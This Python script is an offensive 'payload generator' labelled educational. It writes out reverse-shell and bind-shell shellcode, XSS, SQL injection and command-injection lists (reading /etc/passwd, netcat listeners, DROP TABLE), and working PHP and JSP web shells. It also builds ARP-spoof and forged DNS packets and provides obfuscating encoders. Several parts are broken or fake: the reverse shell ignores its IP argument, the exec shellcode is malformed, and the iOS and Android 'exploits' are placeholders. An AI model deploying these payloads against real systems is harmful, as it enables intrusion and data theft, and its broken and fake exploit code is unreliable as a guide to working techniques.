#!/usr/bin/env python3
"""
Payload Generator - Advanced Exploit Payload Creation
Generates various types of exploit payloads for different attack vectors

WARNING: This is for educational and authorized testing purposes only.
"""

import os
import sys
import base64
import hashlib
import struct
import random
import json
import zlib
from typing import Dict, List, Optional
import argparse

class ShellcodeGenerator:
    """Generate various types of shellcode payloads"""
    
    def __init__(self):
        self.architectures = ['x86', 'x64', 'arm', 'arm64']
        self.platforms = ['linux', 'windows', 'macos', 'ios', 'android']
        
    def generate_reverse_shell(self, ip: str, port: int, arch: str = 'x64', platform: str = 'linux') -> bytes:
        """Generate reverse shell shellcode"""
        print(f"[+] Generating reverse shell payload for {arch}/{platform}")
        
        if platform == 'linux' and arch == 'x64':
            # Linux x64 reverse shell shellcode
            shellcode = (
                b"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a"
                b"\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0"
                b"\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\x68" +
                struct.pack(">H", port) +
                b"\x66\x6a\x02\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f"
                b"\x05\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
                b"\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f"
                b"\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05"
            )
        elif platform == 'windows' and arch == 'x64':
            # Windows x64 reverse shell shellcode (simplified)
            shellcode = b"\x90" * 100  # NOP sled for demonstration
        else:
            # Generic shellcode template
            shellcode = b"\x90" * 64  # NOP sled
            
        return shellcode
        
    def generate_bind_shell(self, port: int, arch: str = 'x64', platform: str = 'linux') -> bytes:
        """Generate bind shell shellcode"""
        print(f"[+] Generating bind shell payload for {arch}/{platform}")
        
        # Simplified bind shell shellcode
        shellcode = (
            b"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a"
            b"\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0"
            b"\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\x68" +
            struct.pack(">H", port) +
            b"\x66\x6a\x02\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05"
        )
        
        return shellcode
        
    def generate_exec_payload(self, command: str, arch: str = 'x64', platform: str = 'linux') -> bytes:
        """Generate command execution shellcode"""
        print(f"[+] Generating exec payload: {command}")
        
        # Convert command to bytes
        cmd_bytes = command.encode('utf-8')
        
        # Simple exec shellcode template
        shellcode = (
            b"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a"
            b"\x3b\x58\x48\xbf" + cmd_bytes + b"\x00\x57\x54\x5f\x0f\x05"
        )
        
        return shellcode

class WebExploitGenerator:
    """Generate web-based exploit payloads"""
    
    def __init__(self):
        self.xss_payloads = []
        self.sqli_payloads = []
        self.rce_payloads = []
        
    def generate_xss_payloads(self) -> List[str]:
        """Generate XSS payloads"""
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onchange=alert('XSS')><option>1</option></select>",
            "<textarea onblur=alert('XSS')></textarea>",
            "<marquee onstart=alert('XSS')></marquee>"
        ]
        
        return payloads
        
    def generate_sqli_payloads(self) -> List[str]:
        """Generate SQL injection payloads"""
        payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "' UNION SELECT username,password FROM users--",
            "'; DROP TABLE users--",
            "' OR 1=1#",
            "' OR 1=1/*",
            "admin'--",
            "admin'#",
            "admin'/*"
        ]
        
        return payloads
        
    def generate_rce_payloads(self) -> List[str]:
        """Generate remote code execution payloads"""
        payloads = [
            "|whoami",
            ";whoami",
            "`whoami`",
            "$(whoami)",
            "|cat /etc/passwd",
            ";cat /etc/passwd",
            "`cat /etc/passwd`",
            "$(cat /etc/passwd)",
            "|nc -l 4444",
            ";nc -l 4444"
        ]
        
        return payloads
        
    def generate_php_shell(self) -> str:
        """Generate PHP web shell"""
        php_shell = '''<?php
if(isset($_GET['cmd'])) {
    $output = shell_exec($_GET['cmd']);
    echo "<pre>$output</pre>";
}
?>
<form method="GET">
    <input type="text" name="cmd" placeholder="Enter command">
    <input type="submit" value="Execute">
</form>'''
        
        return php_shell
        
    def generate_jsp_shell(self) -> str:
        """Generate JSP web shell"""
        jsp_shell = '''<%@ page import="java.util.*,java.io.*"%>
<%
if (request.getParameter("cmd") != null) {
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
        out.println(disr);
        disr = dis.readLine();
    }
}
%>
<form method="GET">
    <input type="text" name="cmd" placeholder="Enter command">
    <input type="submit" value="Execute">
</form>'''
        
        return jsp_shell

class MobileExploitGenerator:
    """Generate mobile exploit payloads"""
    
    def __init__(self):
        self.ios_payloads = []
        self.android_payloads = []
        
    def generate_ios_exploit_payloads(self) -> List[Dict]:
        """Generate iOS exploit payloads"""
        payloads = [
            {
                'name': 'Safari WebKit Exploit',
                'type': 'webkit_exploit',
                'payload': '''
<script>
// WebKit type confusion exploit
var arr = new Array(0x1000);
for(var i = 0; i < arr.length; i++) {
    arr[i] = 0x41414141;
}
// Trigger vulnerability
var obj = {};
obj.__proto__ = arr;
</script>'''
            },
            {
                'name': 'iMessage Exploit',
                'type': 'imessage_exploit',
                'payload': '''
// iMessage arbitrary code execution
// Crafted message with embedded exploit
var message = {
    "type": "text",
    "content": "Hello! Click here: javascript:alert('Exploit')",
    "attachments": [{
        "type": "audio",
        "data": "base64_encoded_exploit_audio"
    }]
};'''
            },
            {
                'name': 'FaceTime Exploit',
                'type': 'facetime_exploit',
                'payload': '''
// FaceTime call with embedded exploit
var callData = {
    "caller": "attacker@evil.com",
    "callee": "victim@target.com",
    "exploit": "base64_encoded_video_exploit"
};'''
            }
        ]
        
        return payloads
        
    def generate_android_exploit_payloads(self) -> List[Dict]:
        """Generate Android exploit payloads"""
        payloads = [
            {
                'name': 'Intent Exploit',
                'type': 'intent_exploit',
                'payload': '''
// Android Intent exploitation
Intent intent = new Intent();
intent.setAction("android.intent.action.VIEW");
intent.setData(Uri.parse("content://com.android.contacts/contacts"));
intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
startActivity(intent);'''
            },
            {
                'name': 'Broadcast Exploit',
                'type': 'broadcast_exploit',
                'payload': '''
// Broadcast receiver exploitation
Intent intent = new Intent("com.evil.EXPLOIT");
intent.putExtra("command", "rm -rf /");
sendBroadcast(intent);'''
            },
            {
                'name': 'Content Provider Exploit',
                'type': 'content_provider_exploit',
                'payload': '''
// Content provider SQL injection
Uri uri = Uri.parse("content://com.vulnerable.app/data");
Cursor cursor = getContentResolver().query(uri, null, 
    "id=' OR 1=1--", null, null);'''
            }
        ]
        
        return payloads

class NetworkExploitGenerator:
    """Generate network-based exploit payloads"""
    
    def __init__(self):
        self.packet_payloads = []
        self.protocol_payloads = []
        
    def _ip_to_bytes(self, ip_str: str) -> bytes:
        """Convert IP string to bytes"""
        import socket
        return socket.inet_aton(ip_str)
        
    def generate_arp_spoof_payload(self, target_ip: str, gateway_ip: str) -> bytes:
        """Generate ARP spoofing payload"""
        print(f"[+] Generating ARP spoof payload for {target_ip}")
        
        # Simplified ARP packet structure
        arp_packet = (
            b"\xff\xff\xff\xff\xff\xff" +  # Destination MAC (broadcast)
            b"\x00\x11\x22\x33\x44\x55" +  # Source MAC
            b"\x08\x06" +                   # ARP protocol
            b"\x00\x01" +                   # Hardware type (Ethernet)
            b"\x08\x00" +                   # Protocol type (IP)
            b"\x06" +                       # Hardware address length
            b"\x04" +                       # Protocol address length
            b"\x00\x02" +                   # Operation (reply)
            b"\x00\x11\x22\x33\x44\x55" +  # Sender MAC
            self._ip_to_bytes(gateway_ip) +  # Sender IP
            b"\x00\x11\x22\x33\x44\x55" +  # Target MAC
            self._ip_to_bytes(target_ip)     # Target IP
        )
        
        return arp_packet
        
    def generate_dns_payload(self, domain: str, malicious_ip: str) -> bytes:
        """Generate malicious DNS payload"""
        print(f"[+] Generating DNS payload for {domain}")
        
        # Simplified DNS response packet
        dns_packet = (
            b"\x00\x01" +                   # Transaction ID
            b"\x81\x80" +                   # Flags (response, authoritative)
            b"\x00\x01" +                   # Questions
            b"\x00\x01" +                   # Answer RRs
            b"\x00\x00" +                   # Authority RRs
            b"\x00\x00" +                   # Additional RRs
            domain.encode() +               # Domain name
            b"\x00\x01\x00\x01" +          # Type and class
            b"\xc0\x0c" +                   # Name pointer
            b"\x00\x01" +                   # Type (A record)
            b"\x00\x01" +                   # Class (IN)
            b"\x00\x00\x00\x3c" +          # TTL (60 seconds)
            b"\x00\x04" +                   # Data length
            self._ip_to_bytes(malicious_ip)  # IP address
        )
        
        return dns_packet
        
    def generate_http_exploit_payload(self, command: str) -> str:
        """Generate HTTP exploit payload"""
        payload = f'''POST /cgi-bin/exploit HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: {len(command) + 8}

cmd={command}'''
        
        return payload

class PayloadEncoder:
    """Encode and obfuscate payloads"""
    
    def __init__(self):
        self.encoding_methods = ['base64', 'hex', 'url', 'rot13', 'xor']
        
    def base64_encode(self, data: bytes) -> str:
        """Base64 encode payload"""
        return base64.b64encode(data).decode('utf-8')
        
    def hex_encode(self, data: bytes) -> str:
        """Hex encode payload"""
        return data.hex()
        
    def url_encode(self, data: str) -> str:
        """URL encode payload"""
        import urllib.parse
        return urllib.parse.quote(data)
        
    def rot13_encode(self, data: str) -> str:
        """ROT13 encode payload"""
        return data.translate(str.maketrans(
            'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
            'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'
        ))
        
    def xor_encode(self, data: bytes, key: int = 0x41) -> bytes:
        """XOR encode payload"""
        return bytes(b ^ key for b in data)
        
    def compress_payload(self, data: bytes) -> bytes:
        """Compress payload using zlib"""
        return zlib.compress(data)
        
    def encrypt_payload(self, data: bytes, key: str = "secret") -> bytes:
        """Simple encryption using XOR with key"""
        key_bytes = key.encode('utf-8')
        encrypted = bytearray()
        
        for i, byte in enumerate(data):
            encrypted.append(byte ^ key_bytes[i % len(key_bytes)])
            
        return bytes(encrypted)

class PayloadGenerator:
    """Main payload generator class"""
    
    def __init__(self):
        self.shellcode_gen = ShellcodeGenerator()
        self.web_gen = WebExploitGenerator()
        self.mobile_gen = MobileExploitGenerator()
        self.network_gen = NetworkExploitGenerator()
        self.encoder = PayloadEncoder()
        
    def generate_all_payloads(self, target_ip: str = "192.168.1.100", target_port: int = 4444):
        """Generate all types of payloads"""
        print("[+] Generating comprehensive payload suite...")
        
        payloads = {
            'shellcode': {
                'reverse_shell': self.shellcode_gen.generate_reverse_shell(target_ip, target_port),
                'bind_shell': self.shellcode_gen.generate_bind_shell(target_port),
                'exec_payload': self.shellcode_gen.generate_exec_payload("whoami")
            },
            'web_exploits': {
                'xss_payloads': self.web_gen.generate_xss_payloads(),
                'sqli_payloads': self.web_gen.generate_sqli_payloads(),
                'rce_payloads': self.web_gen.generate_rce_payloads(),
                'php_shell': self.web_gen.generate_php_shell(),
                'jsp_shell': self.web_gen.generate_jsp_shell()
            },
            'mobile_exploits': {
                'ios_payloads': self.mobile_gen.generate_ios_exploit_payloads(),
                'android_payloads': self.mobile_gen.generate_android_exploit_payloads()
            },
            'network_exploits': {
                'arp_spoof': self.network_gen.generate_arp_spoof_payload(target_ip, "192.168.1.1"),
                'dns_payload': self.network_gen.generate_dns_payload("evil.com", target_ip),
                'http_exploit': self.network_gen.generate_http_exploit_payload("whoami")
            }
        }
        
        return payloads
        
    def save_payloads(self, payloads: Dict, output_dir: str = "payloads"):
        """Save all payloads to files"""
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
            
        # Save shellcode payloads
        shellcode_dir = os.path.join(output_dir, "shellcode")
        if not os.path.exists(shellcode_dir):
            os.makedirs(shellcode_dir)
            
        for name, payload in payloads['shellcode'].items():
            with open(os.path.join(shellcode_dir, f"{name}.bin"), "wb") as f:
                f.write(payload)
                
        # Save web exploit payloads
        web_dir = os.path.join(output_dir, "web")
        if not os.path.exists(web_dir):
            os.makedirs(web_dir)
            
        for name, payload in payloads['web_exploits'].items():
            if isinstance(payload, list):
                with open(os.path.join(web_dir, f"{name}.txt"), "w") as f:
                    for p in payload:
                        f.write(p + "\n")
            else:
                with open(os.path.join(web_dir, f"{name}.php"), "w") as f:
                    f.write(payload)
                    
        # Save mobile exploit payloads
        mobile_dir = os.path.join(output_dir, "mobile")
        if not os.path.exists(mobile_dir):
            os.makedirs(mobile_dir)
            
        for platform, payloads_list in payloads['mobile_exploits'].items():
            platform_dir = os.path.join(mobile_dir, platform)
            if not os.path.exists(platform_dir):
                os.makedirs(platform_dir)
                
            for payload in payloads_list:
                filename = f"{payload['name'].replace(' ', '_').lower()}.txt"
                with open(os.path.join(platform_dir, filename), "w") as f:
                    f.write(f"Name: {payload['name']}\n")
                    f.write(f"Type: {payload['type']}\n")
                    f.write(f"Payload:\n{payload['payload']}\n")
                    
        # Save network exploit payloads
        network_dir = os.path.join(output_dir, "network")
        if not os.path.exists(network_dir):
            os.makedirs(network_dir)
            
        for name, payload in payloads['network_exploits'].items():
            if isinstance(payload, bytes):
                with open(os.path.join(network_dir, f"{name}.bin"), "wb") as f:
                    f.write(payload)
            else:
                with open(os.path.join(network_dir, f"{name}.txt"), "w") as f:
                    f.write(payload)
                    
        # Save encoded versions
        encoded_dir = os.path.join(output_dir, "encoded")
        if not os.path.exists(encoded_dir):
            os.makedirs(encoded_dir)
            
        # Encode shellcode payloads
        for name, payload in payloads['shellcode'].items():
            encoded = self.encoder.base64_encode(payload)
            with open(os.path.join(encoded_dir, f"{name}_base64.txt"), "w") as f:
                f.write(encoded)
                
        print(f"[+] All payloads saved to {output_dir}/")
        
    def generate_custom_payload(self, payload_type: str, **kwargs) -> bytes:
        """Generate custom payload based on type"""
        if payload_type == "reverse_shell":
            return self.shellcode_gen.generate_reverse_shell(
                kwargs.get('ip', '192.168.1.100'),
                kwargs.get('port', 4444),
                kwargs.get('arch', 'x64'),
                kwargs.get('platform', 'linux')
            )
        elif payload_type == "bind_shell":
            return self.shellcode_gen.generate_bind_shell(
                kwargs.get('port', 4444),
                kwargs.get('arch', 'x64'),
                kwargs.get('platform', 'linux')
            )
        elif payload_type == "exec":
            return self.shellcode_gen.generate_exec_payload(
                kwargs.get('command', 'whoami'),
                kwargs.get('arch', 'x64'),
                kwargs.get('platform', 'linux')
            )
        else:
            raise ValueError(f"Unknown payload type: {payload_type}")

def main():
    """Main function"""
    parser = argparse.ArgumentParser(description='Advanced Payload Generator')
    parser.add_argument('--target-ip', '-t', default='192.168.1.100',
                       help='Target IP address')
    parser.add_argument('--target-port', '-p', type=int, default=4444,
                       help='Target port')
    parser.add_argument('--output-dir', '-o', default='payloads',
                       help='Output directory for payloads')
    parser.add_argument('--custom', '-c', 
                       help='Generate custom payload (reverse_shell, bind_shell, exec)')
    parser.add_argument('--command', '-cmd', default='whoami',
                       help='Command for exec payload')
    
    args = parser.parse_args()
    
    generator = PayloadGenerator()
    
    if args.custom:
        # Generate custom payload
        try:
            payload = generator.generate_custom_payload(
                args.custom,
                ip=args.target_ip,
                port=args.target_port,
                command=args.command
            )
            
            if args.custom == "exec":
                filename = f"custom_{args.custom}_{args.command.replace(' ', '_')}.bin"
            else:
                filename = f"custom_{args.custom}.bin"
                
            with open(filename, "wb") as f:
                f.write(payload)
                
            print(f"[+] Custom payload saved to {filename}")
            
        except ValueError as e:
            print(f"[-] Error: {e}")
            return
            
    else:
        # Generate all payloads
        payloads = generator.generate_all_payloads(args.target_ip, args.target_port)
        generator.save_payloads(payloads, args.output_dir)
        
        print(f"[+] Generated {len(payloads)} payload categories")
        print(f"[+] Total payloads: {sum(len(p) if isinstance(p, list) else 1 for p in payloads.values())}")

if __name__ == "__main__":
    main()